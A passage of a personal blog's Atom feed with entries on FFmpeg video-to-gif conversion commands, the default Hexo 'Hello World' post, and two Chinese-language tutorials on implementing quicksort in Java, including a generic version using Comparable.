25 -ss 00:00:01 -i loading.mp4 loading.gif</code></pre><blockquote><p> Copy the <code>ffmpeg</code> binary to <code>/usr/local/bin</code> folder so that you can use <code>ffmpeg</code> command anywhere in your terminal directly.</p></blockquote><h3 id="Convert-mp4-to-gif"><a href="#Convert-mp4-to-gif" class="headerlink" title="Convert mp4 to gif"></a>Convert mp4 to gif</h3><pre><code>ffmpeg -i loading.mp4 -s loading.gifffmpeg -t 25 -ss 00:00:01 -i loading.mp4 -s 540x960 loading.gif</code></pre><p>-s：adjust gif size</p><pre><code>ffmpeg -t 25 -ss 00:00:01 -r 15 -i loading1.mp4 -s 540x960 loading2.gif</code></pre><p>-r：adjust frame rate</p><pre><code>ffmpeg -i loading.mp4 -i logo.png -filter_complex &apos;overlay=10:main_h-overlay_h-10&apos; loading1.mp4</code></pre><p>Add a logo to the lower left corner</p><p>More ffmpeg param at <a href="https://ffmpeg.org/ffmpeg-filters.html" target="_blank" rel="noopener">FFmpeg Filters Documentation</a></p><h2 id="Three-Steps-For-Vedio-Clip"><a href="#Three-Steps-For-Vedio-Clip" class="headerlink" title="Three Steps For Vedio Clip"></a>Three Steps For Vedio Clip</h2><h3 id="1、Convert-mp4-to-png"><a href="#1、Convert-mp4-to-png" class="headerlink" title="1、Convert mp4 to png"></a>1、Convert mp4 to png</h3><pre><code>ffmpeg -i input.mp4 -r 10 frames/frame%03d.png</code></pre><h3 id="2、Remove-unnecessary-files，rename-files-according-to-the-serial-number"><a href="#2、Remove-unnecessary-files，rename-files-according-to-the-serial-number" class="headerlink" title="2、Remove unnecessary files，rename files according to the serial number."></a>2、Remove unnecessary files，rename files according to the serial number.</h3><pre><code>i=0;dir=$(eval pwd); for name in $(ls $dir);do i=$(($i+1));p=$(eval printf &quot;%03d&quot; $i);mv $name frame$p.png; done</code></pre><h3 id="3、Convert-png-to-mp4"><a href="#3、Convert-png-to-mp4" class="headerlink" title="3、Convert png to mp4"></a>3、Convert png to mp4</h3><pre><code>ffmpeg -r 10 -f image2 -i frame%03d.png -pix_fmt yuv420p loading.mp4</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;(&lt;a href=&quot;http://www.osxexperts.net/ffmpeg/ffmpegexperts.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;The original link&lt;/a&gt;﻿)&lt;/p&gt;
&lt;h2 id=&quot;STEP-1-Preparations&quot;&gt;&lt;a href=&quot;#STEP-1-Preparations&quot; class=&quot;headerlink&quot; title=&quot;STEP 1 - Preparations&quot;&gt;&lt;/a&gt;STEP 1 - Preparations&lt;/h2&gt;&lt;h3 id=&quot;Install-Xcode-include-git&quot;&gt;&lt;a href=&quot;#Install-Xcode-include-git&quot; class=&quot;headerlink&quot; title=&quot;Install Xcode(include git)&quot;&gt;&lt;/a&gt;Install &lt;code&gt;Xcode&lt;/code&gt;(include &lt;code&gt;git&lt;/code&gt;)&lt;/h3&gt;&lt;h2 id=&quot;STEP-2-Downloading-all-necessary-source-codes&quot;&gt;&lt;a href=&quot;#STEP-2-Downloading-all-necessary-source-codes&quot; class=&quot;headerlink&quot; title=&quot;STEP 2 - Downloading all necessary source codes&quot;&gt;&lt;/a&gt;STEP 2 - Downloading all necessary source codes&lt;/h2&gt;&lt;p&gt;Download all file into a folder named &lt;code&gt;FFmpeg&lt;/code&gt; on the your disk:&lt;/p&gt;
&lt;h3 id=&quot;1、FFmpeg-source-code&quot;&gt;&lt;a href=&quot;#1、FFmpeg-source-code&quot; class=&quot;headerlink&quot; title=&quot;1、FFmpeg source code&quot;&gt;&lt;/a&gt;1、FFmpeg source code&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Open the Terminal&lt;/li&gt;
&lt;li&gt;write the following in the Terminal : &lt;code&gt;git clone git://git.videolan.org/ffmpeg.git ffmpeg&lt;/code&gt;&lt;br&gt;Because &lt;code&gt;FFmpeg&lt;/code&gt; needs several extra codecs you need some other source codes too. &lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;2、MP3lame-source-code&quot;&gt;&lt;a href=&quot;#2、MP3lame-source-code&quot; class=&quot;headerlink&quot; title=&quot;2、MP3lame source code&quot;&gt;&lt;/a&gt;2、MP3lame source code&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Go to &lt;code&gt;http://lame.sourceforge.net/download.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Download lame source&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="FFmpeg" scheme="http://blog.lxzh.app/tags/FFmpeg/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://blog.lxzh.app/2016/01/01/hello-world/"/>
    <id>http://blog.lxzh.app/2016/01/01/hello-world/</id>
    <published>2016-01-01T05:33:18.000Z</published>
    <updated>2017-10-17T18:02:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">$ hexo g</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br><span class="line">$ hexo d</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>排序算法进阶(一)——快速排序算法(基本类型与复杂类型)</title>
    <link href="http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSorkTemplate/"/>
    <id>http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSorkTemplate/</id>
    <published>2015-08-01T05:06:23.000Z</published>
    <updated>2020-12-25T15:50:25.058Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 一个好的算法，不仅要高效的解决实际问题，还要以代码简介、冗余少为荣！</p><p>&ensp; &ensp; &ensp; <a href="http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSork/"><font color="blue">排序算法进阶(一)</font></a>中介绍了<code>快速排序算法</code>，但_它只适用于int类型的数组_，当我们实际使用中往往会设计到多种数据类型，如<strong>浮点类型</strong>、<strong>字符串类型</strong>，难道需要再为这些类型重写一个除了类型以外其他都一样的方法吗？</p><p>&ensp; &ensp; &ensp; 不用，<strong>java</strong>的<code>泛型类型</code>给了我们这个便利。像我们平时经常用的<strong>List</strong>、<strong>Map</strong>、<strong>Vector</strong>，它的内部实现并不会对每一种数据类型进行适配，因为它们都使用了泛型。</p><a id="more"></a><p>&ensp; &ensp; &ensp; 关于泛型的介绍，这里就不罗嗦了，网上多的是，<a href="http://www.cnblogs.com/anrainie/archive/2012/03/09/2387177.html" target="_blank" rel="noopener"><font color="blue">这里</font></a>附一篇，读者自己研究吧。</p><p>&ensp; &ensp; &ensp; 为了将我们的排序方法改造为一个实用性更广的泛型方法，我们只需要在该方法的返回类型之前加一个<code>&lt;T&gt;</code>，将方法里的int类型换成T泛型类型即可。</p><p>&ensp; &ensp; &ensp; 如<code>QuickSort</code>方法：</p><p>&ensp; &ensp; &ensp; 改造前：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">mid = Partion(n, left, right);</span><br><span class="line">QuickSort(n, left, mid - <span class="number">1</span>);</span><br><span class="line">QuickSort(n, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 改造后：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(T n[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">mid = Partion(n, left, right);</span><br><span class="line">QuickSort(n, left, mid - <span class="number">1</span>);</span><br><span class="line">QuickSort(n, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 为了让<code>T</code>类型之间进行比较，需要实现<code>Comapable</code>接口，因此上述方法得改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T extends Comparable&lt;T&gt;&gt; <span class="function"><span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(T n[],<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">mid = Partion(n, left, right);</span><br><span class="line">QuickSort(n, left, mid - <span class="number">1</span>);</span><br><span class="line">QuickSort(n, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 同样，Partion方法也类似改造：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> &lt;T extends Comparable&lt;T&gt;&gt; <span class="function"><span class="keyword">int</span> <span class="title">Partion</span><span class="params">(T n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line">T pivot = n[left];<span class="comment">// 也可以从n[right]开始</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right &amp;&amp; n[right].compareTo(pivot)&gt;=<span class="number">0</span>)</span><br><span class="line">right--;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[left++] = n[right];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right &amp;&amp; n[left].compareTo(pivot)&lt;=<span class="number">0</span>)</span><br><span class="line">left++;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[right--] = n[left];</span><br><span class="line">&#125;</span><br><span class="line">System.out.println();</span><br><span class="line">&#125;</span><br><span class="line">n[left] = pivot;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp;  仅仅是稍微改改，这个方法就可以应用于String类型的数组的排序了<i class="qqproud">&ensp; &ensp;</i>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String s[]=&#123;<span class="string">"7.0"</span>, <span class="string">"8.0"</span>, <span class="string">"1.0"</span>, <span class="string">"9.0"</span>, <span class="string">"5.0"</span>, <span class="string">"10.0"</span>, <span class="string">"3.0"</span>, <span class="string">"2.0"</span>, <span class="string">"11.0"</span>&#125;;</span><br><span class="line">QuickSort(s, <span class="number">0</span>, n.length - <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 然而，在实际使用过程中，并非总是那么顺心如意<i class="qqsad">&ensp; &ensp;</i>。&ensp; &ensp; &ensp; 虽然上面的String类型数组可以成功应用该排序方法，但之前传入的int[]数组在这时却不能用了<i class="qqcry">&ensp; &ensp;</i>。<img src="https://lxzh.oss-cn-hangzhou.aliyuncs.com/markdown/1487347055581.png" width="404"></p><p>&ensp; &ensp; &ensp; 如上图，该方法不识别int类型了，怎么回事？？？<i class="qqdoubt">&ensp; &ensp;</i><br>百思不得其解，只能网上去搜咯<del>~</del><br>&ensp; &ensp; &ensp; 一开始还以为自己泛型用得不对，以为不是那么回事。<br>&ensp; &ensp; &ensp; 可是<a href="http://www.cnblogs.com/anrainie/archive/2012/03/09/2387272.html" target="_blank" rel="noopener"><font color="blue">这篇</font></a>文章里用得很好的，其中的<code>display</code>方法可以传入<code>int</code>、<code>String</code>、<code>float</code>类型参数，为什么我的不行呢？<i class="qqdoubt">&ensp; &ensp;</i><br>&ensp; &ensp; &ensp; 回过头来自习对比一下两者的用法，不难看出我们这里多了一点：<code>extends Comparable&lt;T&gt;</code>，会不会是它在搞鬼呢？<i class="qqdoubt">&ensp; &ensp; </i><br>&ensp; &ensp; &ensp; 顿时间突然记起来我们平时使用<code>List</code>、<code>ArrayList</code>时，如果要创建整型数组，是不能用<code>List&lt;int&gt;</code>的，必须用List&lt;<font color="red">Integer</font>&gt;才行，同理<code>List &lt;float&gt;</code>、<code>List &lt;double&gt;</code>都必须用List&lt;<font color="red">Float</font>&gt;、List&lt;<font color="red">Double</font>&gt;。<br>&ensp; &ensp; &ensp; 为啥呢？<br>&ensp; &ensp; &ensp; 网上搜了一下“<strong>java中的int与Integer的区别</strong>”，果然发现有猫腻<i class="qqcurse">&ensp; &ensp;</i>，见<a href="http://www.cnblogs.com/shenliang123/archive/2011/10/27/2226903.html" target="_blank" rel="noopener"><font color="blue">这里</font></a>，讲得很详细，只恨自己java基础掌握得不牢啊！！！<i class="qqangry">&ensp; &ensp;</i><br>&ensp; &ensp; &ensp; 还有一点就是，基本数据类型是不需要实现<code>comparable</code>接口就可以直接进行比较的，而复杂类都实现了该接口，不信可以试一试，<a href="http://blog.chinaunix.net/uid-20586655-id-294755.html" target="_blank" rel="noopener"><font color="blue">这里</font></a>有个方法可以验证一个类是否实现了某个类接口，可以拿来判断一下<code>Integer</code>、<code>Double</code>、<code>Float</code>、<code>String</code>。（注：传递的接口名需要包括接口的全名，即包括包名的，这里应该是：<code>java.lang.Comparable</code>，而不是<code>Comparable</code>）</p><p>&ensp; &ensp; &ensp; 到了这里，终于搞明白了，扩展的排序方法在使用时，传入的参数只能是复杂类型，基本类型就没办法了咯~<i class="qqcry">&ensp; &ensp;</i></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 一个好的算法，不仅要高效的解决实际问题，还要以代码简介、冗余少为荣！&lt;/p&gt;
&lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; &lt;a href=&quot;http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSork/&quot;&gt;&lt;font color=&quot;blue&quot;&gt;排序算法进阶(一)&lt;/font&gt;&lt;/a&gt;中介绍了&lt;code&gt;快速排序算法&lt;/code&gt;，但_它只适用于int类型的数组_，当我们实际使用中往往会设计到多种数据类型，如&lt;strong&gt;浮点类型&lt;/strong&gt;、&lt;strong&gt;字符串类型&lt;/strong&gt;，难道需要再为这些类型重写一个除了类型以外其他都一样的方法吗？&lt;/p&gt;
&lt;p&gt;&amp;ensp; &amp;ensp; &amp;ensp; 不用，&lt;strong&gt;java&lt;/strong&gt;的&lt;code&gt;泛型类型&lt;/code&gt;给了我们这个便利。像我们平时经常用的&lt;strong&gt;List&lt;/strong&gt;、&lt;strong&gt;Map&lt;/strong&gt;、&lt;strong&gt;Vector&lt;/strong&gt;，它的内部实现并不会对每一种数据类型进行适配，因为它们都使用了泛型。&lt;/p&gt;
    
    </summary>
    
    
      <category term="data structure" scheme="http://blog.lxzh.app/tags/data-structure/"/>
    
  </entry>
  
  <entry>
    <title>排序算法进阶(一)——快速排序算法</title>
    <link href="http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSork/"/>
    <id>http://blog.lxzh.app/2015/08/01/Advanced-Sorting-Algorithm-QuickSork/</id>
    <published>2015-07-31T17:02:02.000Z</published>
    <updated>2019-11-06T18:21:07.829Z</updated>
    
    <content type="html"><![CDATA[<p>&ensp; &ensp; &ensp; 偶然间看了一篇微信上的<a href="http://mp.weixin.qq.com/s?__biz=MjM5MDI1ODUyMA==&mid=205210773&idx=2&sn=ed7b667fcee8e2b4d165d279b4140c1c&scene=4#wechat_redirect" target="_blank" rel="noopener"><font color="blue">文章</font></a>，CSDN<a href="http://blog.csdn.net/adinike1/article/details/31767285" target="_blank" rel="noopener"><font color="blue">链接</font></a>，里面介绍了十大算法，分别是：</p><p>一：快速排序算法<br>二：堆排序算法<br>三：归并排序<br>四：二分查找算法<br>五：BFPRT(线性查找算法)<br>六：DFS(深度优先搜索)<br>七：BFS(广度优先搜索)<br>八：Dijkstra算法<br>九：动态规划算法<br>十：朴素贝叶斯分类算法</p><a id="more"></a><p>&ensp; &ensp; &ensp; 虽然前面自己整理里几个基本排序查找算法，但看了这篇文章真有点惭愧啊！因此想抽空学习整理一下这些算法。</p><p>&ensp; &ensp; &ensp; 首先就从<a href="http://student.zjzk.cn/course_ware/data_structure/web/paixu/paixu8.3.2.1.htm" target="_blank" rel="noopener"><font color="blue">快速排序算法</font></a>入手，废话不多说，上图：<br>&lt;img src=”<a href="https://lxzh.oss-cn-hangzhou.aliyuncs.com/Sorting_quicksort_anim.gif&quot;" target="_blank" rel="noopener">https://lxzh.oss-cn-hangzhou.aliyuncs.com/Sorting_quicksort_anim.gif&quot;</a> width=”500”/ alt=”快速排序”&gt;</p><p>&ensp; &ensp; &ensp; 不过，正式写之前还是有必要做一些简单介绍，掌握一个好的算法，它的背景尝试也得了解一下嘛！</p><h1 id="算法的概念："><a href="#算法的概念：" class="headerlink" title="算法的概念："></a>算法的概念：</h1><p>&ensp; &ensp; &ensp; <strong>快速排序</strong>（<code>Quicksort</code>）是对冒泡排序的一种改进。由<strong>C. A. R. Hoare</strong>在1962年提出。</p><h1 id="算法思想："><a href="#算法思想：" class="headerlink" title="算法思想："></a>算法思想：</h1><p>&ensp; &ensp; &ensp; <strong>用分治法</strong>（<code>Divide and conquer</code>）策略来把一个串行（list）分为两个子串（sub-lists）：通过一趟排序将要排序的数据分割成独立的两部分，其中一部分的所有数据都比另外一部分的所有数据都要小，然后再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此达到整个数据变成有序序列。</p><h1 id="实现思路："><a href="#实现思路：" class="headerlink" title="实现思路："></a>实现思路：</h1><p>&ensp; &ensp; &ensp; <strong>①</strong> 以第一个关键字 n1 为控制字，将 [n1 ,n2 ,…,nk ] 分成两个子区，使左区所有关键字小于等于 n1 ，右区所有关键字大于等于 n1 ，最后控制字居两个子区中间的适当位置。在子区内数据尚处于无序状态。<br>&ensp; &ensp; &ensp; <strong>②</strong> 把左区作为一个整体，用①的步骤进行处理，右区进行相同的处理。（即递归）<br>&ensp; &ensp; &ensp; <strong>③</strong> 重复第①、②步，直到左区处理完毕。</p><h1 id="算法步骤："><a href="#算法步骤：" class="headerlink" title="算法步骤："></a>算法步骤：</h1><p>&ensp; &ensp; &ensp; *<em>1) *</em>从数列中挑出一个元素，称为 “基准”（pivot），<br>&ensp; &ensp; &ensp; *<em>2) *</em>重新排序数列，所有元素比基准值小的摆放在基准前面，所有元素比基准值大的摆在基准的后面（相同的数可以到任一边）。在这个分区退出之后，该基准就处于数列的中间位置。这个称为分区（partition）操作。<br>&ensp; &ensp; &ensp; *<em>3) *</em> 递归地（recursive）把小于基准值元素的子数列和大于基准值元素的子数列排序。<br>&ensp; &ensp; &ensp; 递归的最底部情形，是数列的大小是零或一，也就是永远都已经被排序好了。虽然一直递归下去，但是这个算法总会退出，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</p><h1 id="实现代码："><a href="#实现代码：" class="headerlink" title="实现代码："></a>实现代码：</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">mid = Partion(n, left, right);</span><br><span class="line">QuickSort(n, left, mid - <span class="number">1</span>);</span><br><span class="line">QuickSort(n, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Partion</span><span class="params">(<span class="keyword">int</span> n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> pivot = n[left];<span class="comment">// 也可以从n[right]开始</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right &amp;&amp; n[right] &gt;= pivot)</span><br><span class="line">right--;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[left++] = n[right];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (left &lt; right &amp;&amp; n[left] &lt;= pivot)</span><br><span class="line">left++;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">n[right--] = n[left];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">n[left] = pivot;</span><br><span class="line"><span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 为了更加直观的显示算法运行过程中数组数据变化情况，这里仍旧加一个打印函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printList</span><span class="params">(<span class="keyword">int</span>[] n)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> len = n.length;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">System.out.print(n[i] + <span class="string">","</span>);</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">""</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp; &ensp; &ensp; 随便写一个数组<code>int n[] = { 7, 8, 1, 9, 5, 10, 3, 2, 11 };</code><br>&ensp; &ensp; &ensp; 通过打印中间结果来展示排序情况，完整代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: lxzh</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@E</span>-mail: 1239848066@qq.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@qq</span>: 1239848066</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2015年8月1日上午12:01:31</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>: 1.0 Dscription: 快速排序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSortDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n[] = &#123; <span class="number">7</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">11</span> &#125;;</span><br><span class="line">printList(n);</span><br><span class="line">QuickSort(n, <span class="number">0</span>, n.length - <span class="number">1</span>);</span><br><span class="line">printList(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">QuickSort</span><span class="params">(<span class="keyword">int</span> n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> mid;</span><br><span class="line"><span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">mid = Partion(n, left, right);</span><br><span class="line">QuickSort(n, left, mid - <span class="number">1</span>);</span><br><span class="line">QuickSort(n, mid + <span class="number">1</span>, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">Partion</span><span class="params">(<span class="keyword">int</span> n[], <span class="keyword">int</span> left, <span class="keyword">int</span> right)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> pivot = n[left];<span class="comment">// 也可以从n[right]开始</span></span><br><span class="line"><span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line"><span 